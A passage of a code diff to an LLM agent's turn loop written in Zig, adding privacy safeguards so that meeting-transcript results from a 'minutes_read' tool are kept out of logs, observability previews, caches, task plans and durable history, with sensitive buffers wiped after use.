             const trace_tool = self.canonical_trace_tool_name(call.name);
             var tool_use_id_buf: [96]u8 = undefined;
-            const tool_use_id = toolUseIdForCall(call, iteration, i, &tool_use_id_buf);
-            const command = toolCommandFromCall(call);
-            const file_hint = toolFileFromCall(call);
+            const tool_use_id = if (minutes_foreground_latched)
+                std.fmt.bufPrint(&tool_use_id_buf, "minutes-read:{d}:{d}", .{ iteration, i }) catch "minutes-read"
+            else
+                toolUseIdForCall(call, iteration, i, &tool_use_id_buf);
+            const command = if (minutes_foreground_latched) null else toolCommandFromCall(call);
+            const file_hint = if (minutes_foreground_latched) null else toolFileFromCall(call);
             var files_buf: [1][]const u8 = undefined;
             const files = filesFromHint(file_hint, &files_buf);
-            self.last_executed_tool = call.name;
-            const tool_start_event = ObserverEvent{ .tool_call_start = .{
-                .tool = trace_tool,
-                .tool_use_id = tool_use_id,
-                .input_preview = call.arguments_json,
-                .command = command,
-                .files = files,
-                .activity_label = toolActivityLabel(call.name),
-                .run_id = self.current_run_id,
-            } };
+            // Keep only the registered/static canonical name beyond this
+            // iteration. `call.name` is provider-owned parse memory and is
+            // freed (securely wiped for Minutes) by the loop cleanup.
+            self.last_executed_tool = trace_tool;
+            const tool_start_event = ObserverEvent{
+                .tool_call_start = .{
+                    .tool = trace_tool,
+                    .tool_use_id = tool_use_id,
+                    // Minutes arguments can contain meeting identifiers/cursors.
+                    // Keep the tool identity + timing, never its sensitive input.
+                    .input_preview = if (isMinutesReadCall(call.name)) null else call.arguments_json,
+                    .command = command,
+                    .files = files,
+                    .activity_label = toolActivityLabel(call.name),
+                    .run_id = self.current_run_id,
+                },
+            };
             self.observer.recordEvent(&tool_start_event);
 
             hooks_mod.runHooks(self.allocator, self.hooks, .tool_start, .{
@@ -3450,8 +3999,8 @@ pub const Agent = struct {
                             .duration_ms = tool_duration,
                             .success = result.success,
                             .tool_use_id = tool_use_id,
-                            .output_preview = result.output,
-                            .output_truncated = result.output.len > 256,
+                            .output_preview = if (isMinutesReadCall(call.name)) null else result.output,
+                            .output_truncated = !isMinutesReadCall(call.name) and result.output.len > 256,
                             .result_summary = "failed",
                             .command = command,
                             .files = files,
@@ -3530,18 +4079,21 @@ pub const Agent = struct {
                 observability.recordMetricGlobal(.{ .tool_call_latency_ms = .{ .tool = call.name, .value = tool_duration } });
             }
 
-            const tool_event = ObserverEvent{ .tool_call = .{
-                .tool = trace_tool,
-                .duration_ms = tool_duration,
-                .success = result.success,
-                .tool_use_id = tool_use_id,
-                .output_preview = result.output,
-                .output_truncated = result.output.len > 256,
-                .result_summary = if (cache_hit_used) "cache_hit" else if (result.success) "completed" else "failed",
-                .command = command,
-                .files = files,
-                .run_id = self.current_run_id,
-            } };
+            const tool_event = ObserverEvent{
+                .tool_call = .{
+                    .tool = trace_tool,
+                    .duration_ms = tool_duration,
+                    .success = result.success,
+                    .tool_use_id = tool_use_id,
+                    // The Minutes body is transcript PII, not observability data.
+                    .output_preview = if (isMinutesReadCall(call.name)) null else result.output,
+                    .output_truncated = !isMinutesReadCall(call.name) and result.output.len > 256,
+                    .result_summary = if (cache_hit_used) "cache_hit" else if (result.success) "completed" else "failed",
+                    .command = command,
+                    .files = files,
+                    .run_id = self.current_run_id,
+                },
+            };
             self.observer.recordEvent(&tool_event);
 
             hooks_mod.runHooks(self.allocator, self.hooks, .tool_end, .{
@@ -3694,6 +4246,17 @@ pub const Agent = struct {
         var force_serial_tail = false;
 
         for (parsed_calls, 0..) |call, i| {
+            if (isMinutesReadCall(call.name) and !self.canInvokeMinutesRead()) {
+                blocked[i] = true;
+                blocked_sources[i] = .capability_unavailable;
+                ordered_results[i] = .{
+                    .name = call.name,
+                    .output = MINUTES_CAPABILITY_BLOCKED_OUTPUT,
+                    .success = false,
+                    .tool_call_id = call.tool_call_id,
+                };
+                continue;
+            }
             const trace_tool = self.canonical_trace_tool_name(call.name);
             var tool_use_id_buf: [96]u8 = undefined;
             const tool_use_id = toolUseIdForCall(call, iteration, i, &tool_use_id_buf);
@@ -3704,7 +4267,7 @@ pub const Agent = struct {
             const tool_start_event = ObserverEvent{ .tool_call_start = .{
                 .tool = trace_tool,
                 .tool_use_id = tool_use_id,
-                .input_preview = call.arguments_json,
+                .input_preview = if (isMinutesReadCall(call.name)) null else call.arguments_json,
                 .command = command,
                 .files = files,
                 .activity_label = toolActivityLabel(call.name),
@@ -3772,8 +4335,8 @@ pub const Agent = struct {
                     .duration_ms = ordered_durations[i],
                     .success = result.success,
                     .tool_use_id = tool_use_id,
-                    .output_preview = result.output,
-                    .output_truncated = result.output.len > 256,
+                    .output_preview = if (isMinutesReadCall(call.name)) null else result.output,
+                    .output_truncated = !isMinutesReadCall(call.name) and result.output.len > 256,
                     .result_summary = if (result.success) "completed" else "failed",
                     .command = command,
                     .files = files,
@@ -3978,6 +4541,41 @@ pub const Agent = struct {
         return .{ .ptr = @ptrCast(self), .vtable = &agent_controller_vtable };
     }
 
+    /// Keep the after-turn snapshot out of `turnOutcome`'s already-large
+    /// debug frame. Zig lowers a defer at every error/return edge; leaving the
+    /// snapshot inline duplicates its result temporaries across those edges.
+    noinline fn finishContextTurn(
+        self: *Agent,
+        ingest_out: *const context_engine.IngestOutput,
+        assemble_result: *const context_engine.AssembleResult,
+        assemble_duration_ms: u64,
+        turn_compaction_ms: u64,
+        turn_start_ms: i64,
+    ) void {
+        const compact_method: context_engine.CompactResult.CompactMethod = if (!self.last_turn_compacted)
+            .none
+        else if (self.context_force_compressed)
+            .force_compress
+        else
+            .auto;
+        _ = self.context_engine_state.afterTurn(
+            self.allocator,
+            ingest_out.result,
+            assemble_result.*,
+            .{
+                .compacted = self.last_turn_compacted,
+                .method = compact_method,
+            },
+            .{
+                .ingest_ms = ingest_out.result.memory_enrich_ms,
+                .assemble_ms = assemble_duration_ms,
+                .compact_ms = turn_compaction_ms,
+            },
+            turn_start_ms,
+            self.memory_session_id orelse "none",
+        );
+    }
+
     /// Execute a single conversation turn: send messages to LLM, parse tool calls,
     /// execute tools, and loop until a final text response is produced.
     ///
@@ -3991,6 +4589,11 @@ pub const Agent = struct {
     pub fn turnOutcome(self: *Agent, user_message: []const u8) !TurnOutcome {
         const turn_start_ms = std.time.milliTimestamp();
         self.cancellation_token.reset(); // Clear stale cancellation from previous turn
+        // The raw-user field borrows history-owned bytes only for this turn.
+        // Clear it before slash-command early returns and on every exit so a
+        // later turn can never observe a dangling prior-history pointer.
+        self.clearCurrentTurnProviderOverride();
+        defer self.clearCurrentTurnProviderOverride();
 
         // v1.14.13 Agent F: route all per-turn observer events through the
         // narration wrapper so channel/SSE observers receive progress frames.
@@ -4094,6 +4697,10 @@ pub const Agent = struct {
         var task_plan_checked = false;
         var task_plan_complete_emitted = false;
         var task_plan_created_this_turn = false;
+        // Latched for the remainder of the turn as soon as any response asks
+        // for minutes_read. Declared before the turn-end defers so every
+        // durable control-state boundary can fail closed on a Minutes turn.
+        var minutes_foreground_latched = false;
 
         // **D1.7** — accumulator for task_ids spawned during this turn
         // (via the `spawn` tool — `delegate` is synchronous and inlines
@@ -4118,22 +4725,71 @@ pub const Agent = struct {
         // agent is stuck in a loop — terminate early with a synthesis prompt
         // instead of burning through max_tool_iterations. Hash of 0 is sentinel
         // for "slot unused". ring buffer indexed by `recent_call_idx % 3`.
-        const LOOP_WINDOW: usize = 3;
-        var recent_call_hashes: [LOOP_WINDOW]u64 = .{ 0, 0, 0 };
+        var recent_call_hashes: [LOOP_DETECTION_WINDOW]u64 = .{ 0, 0, 0 };
         var recent_call_idx: usize = 0;
         var loop_detected: bool = false;
 
-        // Handle slash commands before sending to LLM (saves tokens)
+        // Handle slash commands before sending to LLM (saves tokens). A
+        // command continuation may run a nested turn and upgrade this policy.
+        self.command_reply_data_policy = .ordinary;
         if (try self.handleSlashCommand(user_message)) |response| {
-            return TurnOutcome.justText(response);
+            return .{
+                .text = response,
+                .reply_data_policy = self.command_reply_data_policy,
+            };
+        }
+
+        // A Minutes capability is approved only for the configured primary
+        // provider/model. If this user turn needs a separate vision model,
+        // keep ordinary image behavior and remove Minutes from the complete
+        // prompt/native/execution surface for this turn.
+        const prior_minutes_vision_gate = self.minutes_read_disabled_for_turn;
+        const unsafe_minutes_transport = self.minutesReadBudgetEligible() and
+            !self.minutesReadProviderSafe();
+        self.minutes_read_disabled_for_turn = prior_minutes_vision_gate or
+            unsafe_minutes_transport or self.shouldDisableMinutesForVision(user_message);
+        defer self.minutes_read_disabled_for_turn = prior_minutes_vision_gate;
+
+        const prior_runtime_turn_context = tools_mod.getTurnContext();
+        const minutes_budget_revoked = self.minutes_read_disabled_for_turn and
+            prior_runtime_turn_context.minutes_read_budget != null;
+        if (minutes_budget_revoked) {
+            var vision_turn_context = prior_runtime_turn_context;
+            vision_turn_context.minutes_read_budget = null;
+            tools_mod.setTurnContext(vision_turn_context);
+        }
+        defer if (minutes_budget_revoked) tools_mod.setTurnContext(prior_runtime_turn_context);
+
+        const prior_stream_callback = self.stream_callback;
+        const prior_stream_ctx = self.stream_ctx;
+        var sensitive_stream_sink: u8 = 0;
+        if (self.canInvokeMinutesRead() and self.stream_callback == null) {
+            // Even buffered Hub delivery must use the audited streaming
+            // provider transport. The callback can discard live deltas; the
+            // accumulated StreamChatResult still drives the final reply.
+            self.stream_callback = discardSensitiveStream;
+            self.stream_ctx = @ptrCast(&sensitive_stream_sink);
+        }
+        defer {
+            self.stream_callback = prior_stream_callback;
+            self.stream_ctx = prior_stream_ctx;
+        }
+
+        var current_turn_tool_surface = try self.buildCurrentTurnToolSurface();
+        defer current_turn_tool_surface.deinit(self.allocator);
+        self.current_turn_tools = current_turn_tool_surface.tools;
+        self.current_turn_tool_specs = current_turn_tool_surface.specs;
+        self.current_turn_tool_surface_active = true;
+        defer {
+            self.current_turn_tool_surface_active = false;
+            self.current_turn_tools = &.{};
+            self.current_turn_tool_specs = &.{};
         }
 
         self.context_was_compacted = false;
         self.context_force_compressed = false;
         self.last_turn_context = .{};
         self.clearProviderPreflightSample();
-        self.clearCurrentTurnProviderOverride();
-        defer self.clearCurrentTurnProviderOverride();
         self.loadActiveTaskPlanFromMemory();
 
         const turn_start_event = ObserverEvent{ .turn_stage = .{
@@ -4188,7 +4844,17 @@ pub const Agent = struct {
         };
         // Snapshot status for session-end procedural capture before
         // clearing the turn-scoped state. Goal text is borrowed.
-        defer self.snapshotAndClearActiveGoalState();
+        defer {
+            if (minutes_foreground_latched) {
+                // A provider can derive reflection/control text from the raw
+                // transcript. Destroy the turn-local goal state without
+                // replacing the session's last durable verdict.
+                if (self.active_goal_state) |*goal_state| goal_state.deinit(self.allocator);
+                self.active_goal_state = null;
+            } else {
+                self.snapshotAndClearActiveGoalState();
+            }
+        }
 
         // v1.14.18-B G5: Initialize reflection trail for capturing iteration-level learning
         var active_reflection_trail = reflection.ReflectionTrail{
@@ -4206,15 +4872,17 @@ pub const Agent = struct {
         // so by Zig's LIFO ordering it runs FIRST — reading the trail's final
         // state before deinit frees the entries. Covers all 8 return paths.
         defer {
-            const trail_json: ?[]const u8 = active_reflection_trail.serialize(self.allocator) catch |err| blk: {
-                log.warn("failed to serialize reflection trail: {s}", .{@errorName(err)});
-                break :blk self.allocator.dupe(u8, "[]") catch null;
-            };
-            if (trail_json) |j| {
-                // Free the prior turn's trail before overwriting — the field is
-                // reassigned every turn-end; a bare assign leaks the previous alloc.
-                if (self.session_reflection_trail_json) |old| self.allocator.free(old);
-                self.session_reflection_trail_json = j;
+            if (!minutes_foreground_latched) {
+                const trail_json: ?[]const u8 = active_reflection_trail.serialize(self.allocator) catch |err| blk: {
+                    log.warn("failed to serialize reflection trail: {s}", .{@errorName(err)});
+                    break :blk self.allocator.dupe(u8, "[]") catch null;
+                };
+                if (trail_json) |j| {
+                    // Free the prior turn's trail before overwriting — the field is
+                    // reassigned every turn-end; a bare assign leaks the previous alloc.
+                    if (self.session_reflection_trail_json) |old| self.allocator.free(old);
+                    self.session_reflection_trail_json = j;
+                }
             }
         }
 
@@ -4246,30 +4914,13 @@ pub const Agent = struct {
         // returned context-exhausted mid-turn and a subsequent auto-compact
         // also succeeded). Reports `.force_compress` in that case — operator
         // dashboards still see "compaction happened," just not the multiplicity.
-        defer {
-            const compact_method: context_engine.CompactResult.CompactMethod = if (!self.last_turn_compacted)
-                .none
-            else if (self.context_force_compressed)
-                .force_compress
-            else
-                .auto;
-            _ = self.context_engine_state.afterTurn(
-                self.allocator,
-                ingest_out.result,
-                assemble_result,
-                .{
-                    .compacted = self.last_turn_compacted,
-                    .method = compact_method,
-                },
-                .{
-                    .ingest_ms = ingest_out.result.memory_enrich_ms,
-                    .assemble_ms = assemble_duration_ms,
-                    .compact_ms = turn_compaction_ms,
-                },
-                turn_start_ms,
-                self.memory_session_id orelse "none",
-            );
-        }
+        defer self.finishContextTurn(
+            &ingest_out,
+            &assemble_result,
+            assemble_duration_ms,
+            turn_compaction_ms,
+            turn_start_ms,
+        );
 
         // Auto-save user message to memory (nanoTimestamp key to avoid collisions within the same second)
         if (self.auto_save) {
@@ -4473,16 +5124,32 @@ pub const Agent = struct {
         } };
         self.observer.recordEvent(&start_event);
 
-        // Tool call loop — reuse a single arena across iterations (retains pages)
-        var iter_arena = std.heap.ArenaAllocator.init(self.allocator);
+        // `minutes_read` responses are sensitive PII. They need to survive long
+        // enough for the same-turn provider to synthesize a user-visible answer,
+        // but they must never enter durable history, extraction, compaction or
+        // narration. This lane is turn-owned and deinitialized before the
+        // function's earlier turn-end defers run (LIFO), including on errors and
+        // early returns. ContextEngine.compact receives only `self` and reads
+        // `self.history`; combined durable+foreground slices are provider-only
+        // and must never be passed to compaction.
+        var minutes_foreground_history: std.ArrayListUnmanaged(OwnedMessage) = .empty;
+        defer self.deinitSensitiveOwnedMessageList(&minutes_foreground_history);
+
+        // Tool call loop — reuse a single arena across iterations. Its child
+        // wipes pages at final release so Minutes request/response scratch does
+        // not remain in freed heap blocks.
+        var zeroizing_allocator = ZeroizingAllocator{ .child = self.allocator };
+        var iter_arena = std.heap.ArenaAllocator.init(zeroizing_allocator.allocator());
         defer iter_arena.deinit();
+        const provider_allocator = if (self.canInvokeMinutesRead())
+            zeroizing_allocator.allocator()
+        else
+            self.allocator;
 
         // V1.7-cherrypick fix (CR-WIP-03): reset `last_executed_tool` at the
-        // start of every turn. The field is assigned via `self.last_executed_tool
-        // = call.name;` (line ~1981), where `call.name` is allocated in this
-        // iter_arena and freed on the defer above. Without this reset, turn
-        // N+1's cancellation print at lines ~2975-2976 reads freed memory if
-        // cancellation fires before any tool runs in N+1.
+        // start of every turn. The field now retains only a registered/static
+        // canonical tool name, but the reset still prevents a cancellation at
+        // the start of turn N+1 from reporting turn N's last tool.
         self.last_executed_tool = "";
 
         var iteration: u32 = 0;
@@ -4539,23 +5206,25 @@ pub const Agent = struct {
                 return TurnOutcome{
                     .text = cancel_text,
                     .iterations_used = iteration,
+                    .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
                 };
             }
 
             // Build messages slice for provider (arena-owned; freed at end of iteration)
             const build_messages_start_ms = std.time.milliTimestamp();
-            const messages = try self.buildProviderMessages(arena);
+            const messages = try self.buildProviderMessagesWithForeground(arena, minutes_foreground_history.items);
+            const provider_message_count = self.history.items.len + minutes_foreground_history.items.len;
             const build_messages_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - build_messages_start_ms));
             log.info("turn.stage stage=build_provider_messages iteration={d} duration_ms={d} history_messages={d}", .{
                 iteration,
                 build_messages_duration_ms,
-                self.history.items.len,
+                provider_message_count,
             });
             const build_stage_event = ObserverEvent{ .turn_stage = .{
                 .stage = "build_provider_messages",
                 .iteration = iteration,
                 .duration_ms = build_messages_duration_ms,
-                .count = @intCast(@min(self.history.items.len, std.math.maxInt(u32))),
+                .count = @intCast(@min(provider_message_count, std.math.maxInt(u32))),
                 .run_id = self.current_run_id,
             } };
             self.observer.recordEvent(&build_stage_event);
@@ -4573,10 +5242,9 @@ pub const Agent = struct {
             // is useless. An unknown model is treated as text-only and routes
             // through the sidecar, so images are never silently dropped.
             var effective_model: []const u8 = self.model_name;
-            if (shouldRouteToVisionFallback(
-                self.model_name,
-                self.vision_fallback_model,
+            if (self.shouldRouteToVisionFallbackForCurrentTurn(
                 hasImageContentParts(messages),
+                minutes_foreground_latched,
             )) {
                 effective_model = self.vision_fallback_model;
                 log.info("turn.stage stage=vision_fallback iteration={d} from={s} to={s}", .{
@@ -4600,10 +5268,25 @@ pub const Agent = struct {
             // shared by the streaming and blocking provider calls below.
             try self.routeVideoForModel(arena, messages, effective_model, iteration);
             var prompt_cache_key_buf: [69]u8 = undefined;
-            const cache_key = self.promptCacheKey(&prompt_cache_key_buf);
+            // Transcript-bearing prompts must not opt into provider-side cache
+            // affinity. The pre-read request can still use the normal session
+            // key; every request after the exact Minutes latch is uncached.
+            const cache_key = if (minutes_foreground_latched)
+                null
+            else
+                self.promptCacheKey(&prompt_cache_key_buf);
             const chat_request = self.providerChatRequest(messages, effective_model, cache_key, assemble_result.tool_surface_plan);
-            self.recordPromptShape(chat_request, assemble_result);
-            self.sampleProviderPreflight(chat_request, effective_model, iteration);
+            self.recordPromptShape(chat_request, assemble_result, !minutes_foreground_latched);
+            // Provider token-estimation endpoints are a second request sink,
+            // separate from the configured chat processor. Once Minutes has
+            // supplied transcript PII, never mirror that request into a
+            // preflight/tokenizer endpoint. Clear any earlier sample so later
+            // policy decisions cannot accidentally reuse a pre-latch estimate.
+            if (minutes_foreground_latched or self.canInvokeMinutesRead()) {
+                self.clearProviderPreflightSample();
+            } else {
+                self.sampleProviderPreflight(provider_allocator, chat_request, effective_model, iteration);
+            }
             defer self.provider_preflight_active = false;
 
             const timer_start = std.time.milliTimestamp();
@@ -4616,15 +5299,37 @@ pub const Agent = struct {
             // Call provider: streaming or blocking. Reliable wrappers may retry/fallback internally.
             var response: ChatResponse = undefined;
             if (is_streaming) {
+                // Parsing discovers tool calls only after the stream returns.
+                // When Minutes is callable, pre-arm strict hold on the very
+                // first request so a tool-bearing response cannot emit clean-
+                // looking intermediary text before the exact latch is known.
+                // A validated no-tool final response is flushed normally below.
+                const minutes_stream_guard = minutes_foreground_latched or self.canInvokeMinutesRead();
+                // The provider capability is request-aware. The empty probe
+                // used to build the turn's tool surface is only an early
+                // eligibility check; authorize the exact assembled request
+                // again before any transcript-capable send.
+                if (minutes_stream_guard and
+                    !self.provider.supportsSensitiveStreamingForRequest(chat_request))
+                {
+                    return error.SensitiveStreamingUnsupported;
+                }
                 stream_timing_ctx = .{
                     .agent = self,
                     .callback = self.stream_callback.?,
                     .callback_ctx = self.stream_ctx.?,
+                    .scratch_allocator = provider_allocator,
                     .iteration = iteration,
                     .provider_start_ms = timer_start,
+                    // After a Minutes read, hold every streamed delta until the
+                    // parsed response is known to be the final public answer.
+                    // Tool-bearing intermediary text is foreground-only and is
+                    // discarded with this context instead of reaching SSE.
+                    .emission_mode = if (minutes_stream_guard) .hold_for_validation else .undecided,
+                    .strict_hold = minutes_stream_guard,
                 };
                 const stream_result = self.provider.streamChat(
-                    self.allocator,
+                    provider_allocator,
                     chat_request,
                     effective_model,
                     self.temperature,
@@ -4668,13 +5373,18 @@ pub const Agent = struct {
                         // Rebuild messages after compaction — the arena is
                         // still live for this iteration, so buildProviderMessages
                         // reuses it without leaking.
-                        const retry_messages = self.buildProviderMessages(arena) catch |build_err| return build_err;
+                        const retry_messages = self.buildProviderMessagesWithForeground(arena, minutes_foreground_history.items) catch |build_err| return build_err;
                         // Rebuild re-adds video parts — re-apply video routing.
                         try self.routeVideoForModel(arena, retry_messages, effective_model, iteration);
                         const retry_request = self.providerChatRequest(retry_messages, effective_model, cache_key, assemble_result.tool_surface_plan);
-                        self.recordPromptShape(retry_request, assemble_result);
+                        self.recordPromptShape(retry_request, assemble_result, !minutes_foreground_latched);
+                        if (minutes_stream_guard and
+                            !self.provider.supportsSensitiveStreamingForRequest(retry_request))
+                        {
+                            return error.SensitiveStreamingUnsupported;
+                        }
                         const retry_result = self.provider.streamChat(
-                            self.allocator,
+                            provider_allocator,
                             retry_request,
                             effective_model,
                             self.temperature,
@@ -4739,7 +5449,7 @@ pub const Agent = struct {
                 }
             } else {
                 response = self.provider.chat(
-                    self.allocator,
+                    provider_allocator,
                     chat_request,
                     effective_model,
                     self.temperature,
@@ -4770,16 +5480,16 @@ pub const Agent = struct {
                     {
                         turn_retry_attempts += 1;
                         turn_llm_calls += 1;
-                        const recovery_msgs = self.buildProviderMessages(arena) catch |prep_err| return prep_err;
+                        const recovery_msgs = self.buildProviderMessagesWithForeground(arena, minutes_foreground_history.items) catch |prep_err| return prep_err;
                         // Rebuild re-adds video parts — re-apply video routing.
                         try self.routeVideoForModel(arena, recovery_msgs, effective_model, iteration);
                         // effective_model (not self.model_name) — honor the
                         // turn's vision-fallback routing on the recovery call,
                         // matching the initial blocking call and streaming path.
                         const recovery_request = self.providerChatRequest(recovery_msgs, effective_model, cache_key, assemble_result.tool_surface_plan);
-                        self.recordPromptShape(recovery_request, assemble_result);
+                        self.recordPromptShape(recovery_request, assemble_result, !minutes_foreground_latched);
                         break :retry_blk self.provider.chat(
-                            self.allocator,
+                            provider_allocator,
                             recovery_request,
                             effective_model,
                             self.temperature,
@@ -4808,7 +5518,7 @@ pub const Agent = struct {
                     // already vision/video-routed for effective_model above;
                     // the retry must dispatch to the same model.
                     break :retry_blk self.provider.chat(
-                        self.allocator,
+                        provider_allocator,
                         chat_request,
                         effective_model,
                         self.temperature,
@@ -4821,15 +5531,15 @@ pub const Agent = struct {
                         {
                             turn_retry_attempts += 1;
                             turn_llm_calls += 1;
-                            const recovery_msgs = self.buildProviderMessages(arena) catch |prep_err| return prep_err;
+                            const recovery_msgs = self.buildProviderMessagesWithForeground(arena, minutes_foreground_history.items) catch |prep_err| return prep_err;
                             // Rebuild re-adds video parts — re-apply video routing.
                             try self.routeVideoForModel(arena, recovery_msgs, effective_model, iteration);
                             // effective_model (not self.model_name) — honor the
                             // turn's vision-fallback routing on the recovery call.
                             const recovery_request = self.providerChatRequest(recovery_msgs, effective_model, cache_key, assemble_result.tool_surface_plan);
-                            self.recordPromptShape(recovery_request, assemble_result);
+                            self.recordPromptShape(recovery_request, assemble_result, !minutes_foreground_latched);
                             break :retry_blk self.provider.chat(
-                                self.allocator,
+                                provider_allocator,
                                 recovery_request,
                                 effective_model,
                                 self.temperature,
@@ -4839,6 +5549,17 @@ pub const Agent = struct {
                     };
                 };
             }
+
+            // Catch every error/continue/break after response acquisition.
+            // Explicit release sites below remain valid because the helper
+            // clears all owned fields and is therefore idempotent. Before the
+            // parser establishes the exact Minutes latch, conservatively wipe
+            // a response whenever this Agent can invoke minutes_read; it may
+            // already contain a transcript-bearing tool-call burst.
+            defer self.freeResponseFieldsWithPolicy(
+                &response,
+                minutes_foreground_latched or self.canInvokeMinutesRead(),
+            );
 
             const duration_ms: u64 = @as(u64, @intCast(@max(0, std.time.milliTimestamp() - timer_start)));
             const resp_event = ObserverEvent{ .llm_response = .{
@@ -4940,13 +5661,22 @@ pub const Agent = struct {
 
             const raw_response_text = response.contentOrEmpty();
             var response_text = raw_response_text;
+            // Strip/parse a plan before XML fallback, but keep it turn-local
+            // until the response's tool calls have established whether the
+            // Minutes foreground latch applies. Plan text can echo sensitive
+            // meeting identifiers from the same provider-authored call burst.
+            var pending_task_plan: ?task_planner.TaskPlan = null;
+            defer if (pending_task_plan) |*plan|
+                self.deinitTaskPlanWithPolicy(
+                    plan,
+                    minutes_foreground_latched or self.canInvokeMinutesRead(),
+                );
             if (!task_plan_checked) {
                 task_plan_checked = true;
                 const extracted_plan = task_planner.extractTextAndPlan(raw_response_text);
                 if (extracted_plan.plan_xml) |plan_xml| {
-                    if (try task_planner.parseTaskPlan(self.allocator, plan_xml)) |parsed_plan| {
-                        try self.replaceActiveTaskPlan(parsed_plan);
-                        task_plan_created_this_turn = true;
+                    if (try task_planner.parseTaskPlan(provider_allocator, plan_xml)) |parsed_plan| {
+                        pending_task_plan = parsed_plan;
                         if (extracted_plan.text.len > 0 and extracted_plan.text_after.len > 0) {
                             response_text = try std.fmt.allocPrint(arena, "{s}\n\n{s}", .{ extracted_plan.text, extracted_plan.text_after });
                         } else if (extracted_plan.text_after.len > 0) {
@@ -4958,7 +5688,7 @@ pub const Agent = struct {
                 }
             }
             const native_surface_active = assemble_result.tool_surface_plan.sendsNativeTools();
-            const native_transcript_active = native_surface_active and self.supportsProviderNativeTranscript();
+            const native_transcript_active = native_surface_active and self.supportsProviderNativeTranscript(chat_request);
             const response_has_native_tool_calls = response.hasToolCalls();
             const use_native = native_surface_active or response_has_native_tool_calls;
 
@@ -4991,18 +5721,36 @@ pub const Agent = struct {
             var native_canary_rejected_xml_count: usize = 0;
 
             defer {
+                // Parsing and cloning happen before the exact Minutes latch is
+                // assigned below. Infer sensitivity from the parsed burst as
+                // well so an intervening error still clears every owned copy.
+                const sensitive = minutes_foreground_latched or parsedCallsContainMinutesRead(parsed_calls);
                 if (free_parsed_calls) {
                     for (parsed_calls) |call| {
+                        if (sensitive) {
+                            wipeOwnedBytes(call.name);
+                            wipeOwnedBytes(call.arguments_json);
+                            if (call.tool_call_id) |id| wipeOwnedBytes(id);
+                        }
                         self.allocator.free(call.name);
                         self.allocator.free(call.arguments_json);
                         if (call.tool_call_id) |id| self.allocator.free(id);
                     }
                     self.allocator.free(parsed_calls);
                 }
-                if (free_parsed_text and parsed_text.len > 0) self.allocator.free(parsed_text);
-                if (free_assistant_history and assistant_history_content.len > 0) self.allocator.free(assistant_history_content);
+                if (free_parsed_text and parsed_text.len > 0) {
+                    freeOwnedBytesWithPolicy(self.allocator, parsed_text, sensitive);
+                }
+                if (free_assistant_history and assistant_history_content.len > 0) {
+                    freeOwnedBytesWithPolicy(self.allocator, assistant_history_content, sensitive);
+                }
                 if (!assistant_native_tool_calls_transferred and assistant_native_tool_calls.len > 0) {
                     for (assistant_native_tool_calls) |tc| {
+                        if (sensitive) {
+                            wipeOwnedBytes(tc.id);
+                            wipeOwnedBytes(tc.name);
+                            wipeOwnedBytes(tc.arguments);
+                        }
                         if (tc.id.len > 0) self.allocator.free(tc.id);
                         if (tc.name.len > 0) self.allocator.free(tc.name);
                         if (tc.arguments.len > 0) self.allocator.free(tc.arguments);
@@ -5014,23 +5762,23 @@ pub const Agent = struct {
             if (use_native) {
                 const parse_start_ms = std.time.milliTimestamp();
                 // Provider returned structured tool_calls — convert them
-                parsed_calls = try dispatcher.parseStructuredToolCalls(self.allocator, response.tool_calls);
+                parsed_calls = try dispatcher.parseStructuredToolCalls(provider_allocator, response.tool_calls);
                 free_parsed_calls = true;
 
                 if (parsed_calls.len == 0) {
                     // Structured calls were empty (e.g. all had empty names) — try XML fallback
-                    self.allocator.free(parsed_calls);
+                    provider_allocator.free(parsed_calls);
                     free_parsed_calls = false;
 
-                    const xml_parsed = try dispatcher.parseToolCalls(self.allocator, response_text);
+                    const xml_parsed = try dispatcher.parseToolCalls(provider_allocator, response_text);
                     if (assemble_result.tool_surface_plan.native_strict_canary and xml_parsed.calls.len > 0) {
                         native_canary_rejected_xml_count = xml_parsed.calls.len;
                         for (xml_parsed.calls) |call| {
-                            self.allocator.free(call.name);
-                            self.allocator.free(call.arguments_json);
-                            if (call.tool_call_id) |id| self.allocator.free(id);
+                            provider_allocator.free(call.name);
+                            provider_allocator.free(call.arguments_json);
+                            if (call.tool_call_id) |id| provider_allocator.free(id);
                         }
-                        self.allocator.free(xml_parsed.calls);
+                        provider_allocator.free(xml_parsed.calls);
                         parsed_calls = &.{};
                         free_parsed_calls = false;
                         parsed_text = if (xml_parsed.text.len > 0)
@@ -5058,10 +5806,10 @@ pub const Agent = struct {
                 // when no stripping happened (native tool_calls, no XML found).
                 const history_text = if (free_parsed_text and parsed_text.len > 0) parsed_text else response_text;
                 assistant_history_content = if (native_transcript_active)
-                    try self.allocator.dupe(u8, history_text)
+                    try provider_allocator.dupe(u8, history_text)
                 else
                     try dispatcher.buildAssistantHistoryWithToolCalls(
-                        self.allocator,
+                        provider_allocator,
                         history_text,
                         parsed_calls,
                     );
@@ -5083,7 +5831,7 @@ pub const Agent = struct {
             } else {
                 const parse_start_ms = std.time.milliTimestamp();
                 // No native tool calls — parse response text for XML tool calls
-                const xml_parsed = try dispatcher.parseToolCalls(self.allocator, response_text);
+                const xml_parsed = try dispatcher.parseToolCalls(provider_allocator, response_text);
                 parsed_calls = xml_parsed.calls;
                 free_parsed_calls = true;
                 parsed_text = xml_parsed.text;
@@ -5113,6 +5861,30 @@ pub const Agent = struct {
                     .run_id = self.current_run_id,
                 } };
                 self.observer.recordEvent(&parse_stage_event);
+            }
+
+            // Latch on the exact canonical tool name before any assistant/tool
+            // message from this iteration is appended. A mixed burst is kept as
+            // one foreground transcript so native tool-call/result ordering
+            // remains valid even when `minutes_read` is not the first call.
+            if (!minutes_foreground_latched and self.canInvokeMinutesRead() and parsedCallsContainMinutesRead(parsed_calls)) {
+                minutes_foreground_latched = true;
+                // The pre-read request shape is harmless, but retaining it after
+                // this boundary makes diagnostics ambiguous. Reset now and skip
+                // every transcript-bearing capture below so no FNV-derived state
+                // can depend on meeting bytes.
+                self.last_prompt_shape = .{};
+            }
+
+            if (pending_task_plan) |parsed_plan| {
+                // A Minutes-bearing response is foreground-only as a whole.
+                // Leaving the plan pending lets the defer destroy it without
+                // replacing durable plan state or emitting plan lifecycle data.
+                if (!minutes_foreground_latched) {
+                    try self.replaceActiveTaskPlan(parsed_plan);
+                    pending_task_plan = null;
+                    task_plan_created_this_turn = true;
+                }
             }
 
             // Determine display text
@@ -5149,46 +5921,51 @@ pub const Agent = struct {
             // v1.14.18-B G11: set when the model self-reports `stuck`, so the
